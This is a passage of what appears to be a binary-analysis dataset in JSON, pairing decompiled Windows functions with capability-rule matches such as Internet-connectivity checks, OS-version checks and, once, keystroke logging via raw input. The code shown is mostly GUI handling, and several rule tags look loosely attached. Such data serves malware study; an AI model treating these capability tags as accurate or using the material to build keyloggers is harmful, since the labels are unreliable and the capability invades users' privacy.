        "token_count": 702
    },
    "00447550": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00447550(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint *arg_8h_00;\n    int32_t var_1ch;\n    int32_t iStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar2 = fcn.00442b74();\n    if (((in_ECX == 0) || (*(in_ECX + 0x9c) == '\\0')) || (iVar2 < 2)) {\n        uVar3 = fcn.0043d290();\n        arg_8h_00 = &var_1ch;\n        fcn.0043d24c();\n        fcn.0041b080(arg_8h_00, uVar3);\n        *arg_8h = var_1ch;\n        arg_8h[1] = iStack28;\n        arg_8h[2] = iStack24;\n        arg_8h[3] = iStack20;\n        if (0 < iVar2) {\n            if (arg_ch == '\\x01') {\n                iVar2 = arg_8h[3] >> 1;\n                if (iVar2 < 0) {\n                    iVar2 = iVar2 + ((arg_8h[3] & 1U) != 0);\n                }\n                arg_8h[3] = iVar2;\n            }\n            else if (arg_ch == '\\x02') {\n                iVar2 = arg_8h[3] >> 1;\n                if (iVar2 < 0) {\n                    iVar2 = iVar2 + ((arg_8h[3] & 1U) != 0);\n                }\n                arg_8h[1] = iVar2;\n            }\n            else if (arg_ch == '\\x03') {\n                iVar2 = arg_8h[2] >> 1;\n                if (iVar2 < 0) {\n                    iVar2 = iVar2 + ((arg_8h[2] & 1U) != 0);\n                }\n                arg_8h[2] = iVar2;\n            }\n            else if (arg_ch == '\\x04') {\n                iVar2 = arg_8h[2] >> 1;\n                if (iVar2 < 0) {\n                    iVar2 = iVar2 + ((arg_8h[2] & 1U) != 0);\n                }\n                *arg_8h = iVar2;\n            }\n        }\n    }\n    else {\n        var_4h = *(in_ECX + 0x40);\n        var_8h = *(in_ECX + 0x44);\n        uVar4 = *(in_ECX + 0x48);\n        var_ch = *(in_ECX + 0x4c);\n        if (arg_ch - 3U < 2) {\n            uVar1 = uVar4 & 1;\n            uVar4 = uVar4 >> 1;\n            if (uVar4 < 0) {\n                uVar4 = uVar4 + (uVar1 != 0);\n            }\n        }\n        else if (arg_ch - 1U < 2) {\n            var_ch = *(in_ECX + 0x4c) >> 1;\n            if (var_ch < 0) {\n                var_ch = var_ch + ((*(in_ECX + 0x4c) & 1) != 0);\n            }\n        }\n        if (arg_ch == '\\x02') {\n            var_8h = var_8h + var_ch;\n        }\n        else if (arg_ch == '\\x04') {\n            var_4h = var_4h + uVar4;\n        }\n        fcn.0041b0a8(&var_1ch, var_ch);\n        *arg_8h = var_1ch;\n        arg_8h[1] = iStack28;\n        arg_8h[2] = iStack24;\n        arg_8h[3] = iStack20;\n    }\n    uVar3 = fcn.0044407c(0, arg_8h, 2);\n    sub.user32.dll_MapWindowPoints(uVar3);\n    return;\n}\n",
        "token_count": 979
    },
    "00447790": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00447790(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStackY52;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    uStack40 = 0x4479fd;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puVar2 = &stack0xfffffffc;\n    if (param_2 == 0) {\n        fcn.0040675c();\n        uStackY52 = 0x4477d0;\n        fcn.0040675c(&fcn.00447790::var_4h);\n        fcn.00404890();\n        fcn.0040c8dc();\n        fcn.00403fc0();\n        puVar2 = puStack36;\n    }\n    puStack36 = puVar2;\n    if (*(param_2 + 4) == 0) {\n        fcn.0040675c();\n        uStackY52 = 0x447811;\n        fcn.0040675c(&fcn.00447790::var_ch);\n        fcn.00404890();\n        fcn.0040c8dc();\n        fcn.00403fc0();\n    }\n    iVar3 = fcn.00445ea0();\n    if (iVar3 == 1) {\n        iVar3 = *(in_EAX + 100);\n        *(iVar3 + 8) = 0;\n        *(iVar3 + 0x10) = 0;\n    }\n    else if (iVar3 == 2) {\n        iVar3 = *(param_2 + 0x18);\n        if (iVar3 == 0) {\n            iVar3 = *(param_2 + 0xc);\n        }\n        if (*(iVar3 + 4) == 0) {\n            if (*(param_2 + 0x14) == *(in_EAX + 100)) {\n                fcn.0044642c();\n                uVar4 = fcn.004463f0();\n                *(in_EAX + 0x68) = uVar4;\n                fcn.00403820();\n                *(in_EAX + 100) = iVar3;\n                *(iVar3 + 0xc) = 0;\n                *(iVar3 + 0x18) = 0;\n                *(iVar3 + 0x14) = 0;\n                fcn.00447f78();\n            }\n            else {\n                iVar1 = *(*(param_2 + 0x14) + 0x18);\n                *(*(iVar3 + 8) + 0x18) = iVar1;\n                if (iVar1 == 0) {\n                    *(*(*(param_2 + 0x14) + 0x14) + 8) = *(iVar3 + 8);\n                }\n                else {\n                    *(iVar1 + 0xc) = *(iVar3 + 8);\n                }\n                iVar3 = *(iVar3 + 8);\n                *(iVar3 + 0x14) = *(*(param_2 + 0x14) + 0x14);\n                do {\n                    iVar3 = *(iVar3 + 0xc);\n                    *(iVar3 + 0x14) = *(*(param_2 + 0x14) + 0x14);\n                } while (*(iVar3 + 0xc) != 0);\n                *(iVar3 + 0xc) = *(*(param_2 + 0x14) + 0xc);\n                if (*(iVar3 + 0xc) != 0) {\n                    *(*(iVar3 + 0xc) + 0x18) = iVar3;\n                }\n                uStackY52 = 0x447fa0;\n                fcn.004467a8();\n                fcn.00403820();\n                fcn.00403820();\n            }\n        }\n        else {\n            iVar1 = *(param_2 + 0x14);\n            if (*(in_EAX + 100) == iVar1) {\n                *(*(in_EAX + 100) + 8) = iVar3;\n                *(iVar3 + 0x18) = 0;\n                *(iVar3 + 0xc) = 0;\n                fcn.00445f54();\n                fcn.00446418();\n                fcn.00446278();\n            }\n            else {\n                *(iVar1 + 0x10) = 0;\n                *(iVar1 + 4) = *(iVar3 + 4);\n                *(iVar1 + 8) = 0;\n                fcn.00403820();\n            }\n            uStackY52 = 0x447fa0;\n            fcn.004467a8();\n        }\n    }\n    else {\n        iVar3 = *(param_2 + 0x18);\n        if (iVar3 == 0) {\n            *(*(param_2 + 0x14) + 8) = *(param_2 + 0xc);\n            *(*(param_2 + 0xc) + 0x18) = 0;\n            fcn.00446278();\n        }\n        else {\n            *(iVar3 + 0xc) = *(param_2 + 0xc);\n            if (*(param_2 + 0xc) != 0) {\n                *(*(param_2 + 0xc) + 0x18) = iVar3;\n            }\n            fcn.004463f0();\n            fcn.0044642c();\n            fcn.00446278();\n        }\n        uStackY52 = 0x447fa0;\n        fcn.004467a8();\n    }\n    fcn.00403820();\n    *in_FS_OFFSET = uStackY52;\n    uStack44 = 0x447a04;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 1377
    },
    "00447b24": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00447b24(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x447b36;\n    fcn.00404a78();\n    uStack24 = 0x447b8f;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    iVar1 = fcn.00404888();\n    (**(**(arg_8h + -4) + 0x10))();\n    if (0 < iVar1) {\n        (**(**(arg_8h + -4) + 0x10))();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x447b96;\n    uStack24 = 0x447b8e;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 244
    },
    "00447c58": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00447c58(uint param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uchar *arg_8h;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x447d91;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = 0x447c8d;\n    (**(*param_2 + 0x10))();\n    puStack52 = 0x447c99;\n    piVar1 = fcn.004037f0();\n    uStack56 = 0x447d40;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    iVar2 = fcn.00442ae0();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.00442af4();\n            if ((*(iVar3 + 0x57) == '\\0') && (*(iVar3 + 8) != 0)) {\n                (**(*piVar1 + 0x38))();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar2 = (**(*piVar1 + 0x14))();\n    (**(*param_2 + 0x10))();\n    if (-1 < iVar2 + -1) {\n        do {\n            arg_8h = &stack0xfffffffc;\n            (**(*piVar1 + 0xc))();\n            fcn.00447b24(arg_8h);\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x447d47;\n    uStack56 = 0x447d3f;\n    fcn.00403820();\n    return;\n}\n",
        "token_count": 533
    },
    "00447efc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00447efc(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.004489fc();\n    fcn.00447fb0();\n    sub.user32.dll_ReleaseDC(*(in_EAX + 0x5c), *(in_EAX + 0x58));\n    if (*(*(*(in_EAX + 0x60) + 0x14) + 0x10) == '\\x01') {\n        fcn.00446418();\n    }\n    else {\n        fcn.00446418();\n    }\n    fcn.00447e28();\n    fcn.004467a8(0x447fa0);\n    *(in_EAX + 0x60) = 0;\n    return;\n}\n",
        "token_count": 164
    },
    "00447f78": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00447f78(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x6c) == 0) {\n        iVar1 = fcn.00442ae0();\n        if (0 < iVar1) {\n            fcn.004467a8(0x447fa0);\n        }\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "00447fb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00447fb0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    \n    if (*(in_EAX + 0x60) != 0) {\n        if (*(*(*(in_EAX + 0x60) + 0x14) + 0x10) == '\\x01') {\n            iVar1 = fcn.00445f9c();\n            iVar2 = *(in_EAX + 0xc) >> 1;\n            if (iVar2 < 0) {\n                iVar2 = iVar2 + ((*(in_EAX + 0xc) & 1) != 0);\n            }\n            iVar2 = *(in_EAX + 0x54) - iVar2;\n            iVar3 = fcn.00446020(iVar1, iVar2);\n            iVar3 = iVar3 + iVar1;\n            iVar4 = iVar2 + *(in_EAX + 0xc);\n        }\n        else {\n            iVar1 = *(in_EAX + 0xc) >> 1;\n            if (iVar1 < 0) {\n                iVar1 = iVar1 + ((*(in_EAX + 0xc) & 1) != 0);\n            }\n            iVar1 = *(in_EAX + 0x50) - iVar1;\n            iVar2 = fcn.00445f9c(iVar1);\n            iVar3 = iVar1 + *(in_EAX + 0xc);\n            iVar4 = fcn.00446020(iVar1, iVar2, iVar3);\n            iVar4 = iVar4 + iVar2;\n        }\n        iVar4 = fcn.00426938(iVar1, iVar2, iVar3, iVar4);\n        iVar3 = *(in_EAX + 0x58);\n        uVar5 = sub.gdi32.dll_SelectObject(iVar3, iVar4);\n        sub.gdi32.dll_PatBlt(*(in_EAX + 0x58), iVar3, iVar4, iVar1 - iVar3, iVar2 - iVar4, 0x5a0049);\n        sub.gdi32.dll_SelectObject(*(in_EAX + 0x58), uVar5);\n    }\n    return;\n}\n",
        "token_count": 503
    },
    "0044809c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044809c(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if ((in_EAX != *(arg_8h + -4)) && (*(*(in_EAX + 0x14) + 0x10) == *(*(*(arg_8h + -4) + 0x14) + 0x10))) {\n        iVar1 = fcn.004463f0();\n        iVar2 = fcn.004463f0();\n        if ((iVar2 < iVar1) && ((*(in_EAX + 4) == 0 || ((*(in_EAX + 4) != 0 && (*(*(in_EAX + 4) + 0x57) != '\\0')))))) {\n            fcn.004463f0();\n            uVar3 = fcn.0042d704();\n            *(arg_8h + -8) = uVar3;\n        }\n    }\n    if (*(in_EAX + 0xc) != 0) {\n        fcn.0044809c(arg_8h);\n    }\n    if (*(in_EAX + 8) != 0) {\n        fcn.0044809c(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 294
    },
    "00448278": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00448278(int32_t arg_8h)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x14) != 0) && (*(in_EAX + 0x14) != *(*(arg_8h + -4) + 100))) {\n        iVar2 = fcn.00445eb4();\n        if (iVar2 == 1) {\n            fcn.00448278(arg_8h);\n        }\n    }\n    iVar2 = fcn.00445eb4();\n    if ((iVar2 == 1) || (*(in_EAX + 0x24) == 0)) {\n        bVar1 = true;\n    }\n    else {\n        bVar1 = false;\n        iVar2 = *(*(arg_8h + -4) + 0x18) + *(*(arg_8h + -4) + 0xc) + 0xe;\n        iVar3 = fcn.004464d8();\n        if (iVar3 == 0) {\n            iVar3 = fcn.004464cc();\n            if (iVar3 != 0) {\n                fcn.004464cc();\n                iVar3 = fcn.004463f0();\n                if (iVar3 - *(in_EAX + 0x24) < iVar2) {\n                    bVar1 = true;\n                }\n                else {\n                    fcn.00445f0c();\n                    fcn.00446418();\n                    fcn.004464cc();\n                    fcn.0044646c();\n                }\n            }\n        }\n        else {\n            fcn.004464d8();\n            iVar3 = fcn.004463f0();\n            iVar4 = fcn.00445f0c();\n            if ((iVar3 - iVar4) - *(in_EAX + 0x24) < iVar2) {\n                bVar1 = true;\n            }\n            else {\n                fcn.004463f0();\n                fcn.00446418();\n                fcn.004463f0();\n                fcn.00446418();\n                fcn.004464d8();\n                fcn.0044646c();\n            }\n        }\n    }\n    if (bVar1) {\n        fcn.004460d8();\n    }\n    fcn.004467a8(0x447fa0, *(arg_8h + -4));\n    return;\n}\n",
        "token_count": 557
    },
    "00448438": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00448438(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    piVar3 = arg_8h + -4;\n    iVar1 = *(*piVar3 + 0x18);\n    if (*(*(*(*piVar3 + 0x60) + 0x14) + 0x10) == '\\x01') {\n        iVar2 = fcn.00445f9c();\n        if (*(*piVar3 + 0x54) <= iVar2 + iVar1) {\n            *(*piVar3 + 0x54) = iVar2 + iVar1;\n        }\n        iVar2 = fcn.0044812c();\n        if (iVar2 - iVar1 <= *(*piVar3 + 0x54)) {\n            *(*piVar3 + 0x54) = iVar2 - iVar1;\n        }\n    }\n    else {\n        iVar2 = fcn.00445f9c();\n        if (*(*piVar3 + 0x50) <= iVar2 + iVar1) {\n            *(*piVar3 + 0x50) = iVar2 + iVar1;\n        }\n        iVar2 = fcn.0044812c();\n        if (iVar2 - iVar1 <= *(*piVar3 + 0x50)) {\n            *(*piVar3 + 0x50) = iVar2 - iVar1;\n        }\n    }\n    return;\n}\n",
        "token_count": 326
    },
    "004484c8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004484c8(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff94;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack92 = &stack0xfffffffc;\n    uStack96 = 0x4488a0;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    iVar2 = *param_2;\n    var_4h = in_EAX;\n    if (iVar2 < 0x203) {\n        if (iVar2 == 0x202) {\n            if (in_EAX[0x18] == 0) {\n                puStack92 = &stack0xfffffffc;\n                fcn.004075f8();\n                iVar2 = fcn.00446f34();\n                if ((iVar2 != 0) && (var_10h == 0x14)) {\n                    cVar1 = fcn.004039b8();\n                    if (cVar1 == '\\0') {\n                        fcn.0043d768();\n                    }\n                    else {\n                        fcn.00459ae8();\n                    }\n                }\n            }\n            else {\n                puStack92 = &stack0xfffffffc;\n                fcn.00447efc();\n            }\n        }\n        else if (iVar2 == 0x20) {\n            puStack92 = &stack0xfffffffc;\n            sub.user32.dll_GetCursorPos(&fcn.004484c8::var_ch);\n            in_stack_ffffff94 = 0x44871e;\n            fcn.0043d38c();\n            if (*(param_2 + 2) == 1) {\n                in_stack_ffffff94 = 0x448740;\n                iVar2 = fcn.0044407c();\n                if (iVar2 == param_2[1]) {\n                    in_stack_ffffff94 = 0x448754;\n                    iVar2 = fcn.00442b74();\n                    if (0 < iVar2) {\n                        in_stack_ffffff94 = 0x44876a;\n                        iVar2 = fcn.00446f34();\n                        if ((iVar2 != 0) && (var_10h == 0x12)) {\n                            in_stack_ffffff94 = fcn.0045b200();\n                            sub.user32.dll_SetCursor();\n                            param_2[3] = 1;\n                            goto code_r0x0044888a;\n                        }\n                    }\n                }\n            }\n        }\n        else if (iVar2 == 0x200) {\n            puStack92 = &stack0xfffffffc;\n            if (in_EAX[0x18] != 0) {\n                puStack92 = &stack0xfffffffc;\n                fcn.00447fb0();\n                fcn.004075f8();\n                var_4h[0x14] = var_44h;\n                var_4h[0x15] = var_40h;\n                in_stack_ffffff94 = 0x448586;\n                fcn.00448438(&stack0xfffffffc);\n                fcn.00447fb0();\n            }\n        }\n        else {\n            puStack92 = &stack0xfffffffc;\n            if (iVar2 == 0x201) {\n                puStack92 = &stack0xfffffffc;\n                fcn.004075f8();\n                iVar2 = fcn.00446f34();\n                if (iVar2 != 0) {\n                    if (var_10h == 0x12) {\n                        fcn.00447e9c();\n                    }\n                    else if (var_10h == 2) {\n                        in_stack_ffffff94 = 0x203;\n                        uVar3 = fcn.0044407c(0x203, 0x203, 0);\n                        iVar4 = sub.user32.dll_PeekMessageA(&fcn.004484c8::var_3ch, uVar3);\n                        if ((iVar4 == 0) && (cVar1 = fcn.004039b8(),  cVar1 != '\\0')) {\n                            (**(**(iVar2 + 4) + 0xc4))();\n                        }\n                        if ((*(*(iVar2 + 4) + 0x9b) == '\\x01') && (*(*(iVar2 + 4) + 0x5d) == '\\x01')) {\n                            fcn.0043dee4();\n                        }\n                        goto code_r0x0044888a;\n                    }\n                }\n            }\n        }\n    }\n    else if (iVar2 == 0x203) {\n        fcn.004075f8();\n        iVar2 = fcn.00446f34();\n        if (((iVar2 != 0) && (*(iVar2 + 4) != 0)) && (var_10h == 2)) {\n            fcn.0043c0a8();\n            in_stack_ffffff94 = 0x4485de;\n            fcn.0043e548(1);\n        }\n    }\n    else {\n        if (iVar2 == 0xb030) {\n            puStack92 = &stack0xfffffffc;\n            (*in_EAX[0xc])();\n            if (param_2[3] == 0) {\n                iVar2 = (**(*var_4h + 4))();\n                if (var_10h == 0x12) {\n                    fcn.004045c8();\n                }\n                else if ((iVar2 != 0) && ((var_10h == 2 || (var_10h == 0x14)))) {\n                    fcn.0043d1e8();\n                    (***var_4h)();\n                    var_20h = *(iVar2 + 0x40) * 2 - var_20h;\n                    var_1ch = *(iVar2 + 0x44) * 2 - var_1ch;\n                    var_18h = *(iVar2 + 0x48) * -2 + var_18h * 3 + var_20h * -2;\n                    var_14h = *(iVar2 + 0x4c) * -2 + var_14h * 3 + var_1ch * -2;\n                    fcn.0043d848();\n                    fcn.0040461c();\n                    iVar2 = param_2[2];\n                    *(iVar2 + 0x18) = var_20h;\n                    *(iVar2 + 0x1c) = var_1ch;\n                    *(iVar2 + 0x20) = var_18h;\n                    *(iVar2 + 0x24) = var_14h;\n                }\n            }\n            goto code_r0x0044888a;\n        }\n        puStack92 = &stack0xfffffffc;\n        if ((iVar2 == 0xb042) && (puStack92 = &stack0xfffffffc,  *param_2[2] == 0xb00b)) {\n            puStack92 = &stack0xfffffffc;\n            fcn.004483b0();\n        }\n    }\n    if (*(var_4h + 0x32) != 0) {\n        (*var_4h[0xc])();\n    }\ncode_r0x0044888a:\n    *in_FS_OFFSET = in_stack_ffffff94;\n    uStack100 = 0x4488a7;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 1760
    },
    "004488b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004488b0(uint param_1, char param_2)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.004037f0();\n    *(in_EAX + 4) = 1;\n    *(in_EAX + 8) = 5;\n    if (((**0x48484c == 2) && (3 < **0x484460)) ||\n       ((**0x48484c == 1 && ((4 < **0x484460 || ((**0x484460 == 4 && (9 < **0x4846e4)))))))) {\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = 0;\n    }\n    *(in_EAX + 0xd) = uVar1;\n    fcn.00448a24();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 282
    },
    "00448988": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00448988(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = (***0x484484)(0x13);\n    *(in_EAX + 0xc) = '\\x01' - (iVar1 == 0);\n    return;\n}\n",
        "token_count": 69
    },
    "004489a4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004489a4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char cVar2;\n    \n    iVar1 = (***0x484484)(0x4b);\n    cVar2 = '\\x01' - (iVar1 == 0);\n    *(in_EAX + 0x20) = cVar2;\n    if (cVar2 != '\\0') {\n        sub.user32.dll_SystemParametersInfoA(0x68, 0, in_EAX + 0x10, 0);\n    }\n    return;\n}\n",
        "token_count": 129
    },
    "004489d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004489d4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uchar auStack8 [4];\n    \n    uVar1 = fcn.004076e4(in_EAX + 0x10, auStack8);\n    *(in_EAX + 0x18) = uVar1;\n    *(in_EAX + 0x20) = *(in_EAX + 0x1c) != 0;\n    return;\n}\n",
        "token_count": 107
    },
    "00448a24": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00448a24(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (param_2 == 0) {\n        fcn.00448988();\n        if (*(in_EAX + 0xd) != '\\0') {\n            fcn.004489a4();\n            return;\n        }\n        fcn.004489d4();\n    }\n    else if ((param_2 == 0x68) && (*(in_EAX + 0x20) != '\\0')) {\n        if (*(in_EAX + 0xd) == '\\0') {\n            uVar1 = sub.user32.dll_SendMessageA(*(in_EAX + 0x18), *(in_EAX + 0x14), 0, 0);\n            *(in_EAX + 0x10) = uVar1;\n        }\n        else {\n            sub.user32.dll_SystemParametersInfoA(0x68, 0, in_EAX + 0x10, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 240
    },
    "00448a88": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00448a88(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint uMode;\n    \n    if (*(*0x484858 + 0xc) != '\\0') {\n        uStack16 = 0x8000;\n        puStack20 = 0x448aa6;\n        uVar1 = sub.kernel32.dll_SetErrorMode();\n        uStack24 = 0x448bee;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        if (*0x485afc == 0) {\n            puStack20 = &stack0xfffffffc;\n            in_stack_ffffffd8 = sub.kernel32.dll_GetModuleHandleA_2(0x448bfc);\n            *0x485afc = sub.kernel32.dll_GetProcAddress_1(in_stack_ffffffd8, 0x448c04);\n        }\n        if (*0x483cf0 == 0) {\n            *0x483cf0 = sub.kernel32.dll_LoadLibraryA(0x448c14);\n            if (*0x483cf0 != 0) {\n                *0x485b00 = sub.kernel32.dll_GetProcAddress_1(*0x483cf0, 0x448c20);\n                *0x485b04 = sub.kernel32.dll_GetProcAddress_1(*0x483cf0, 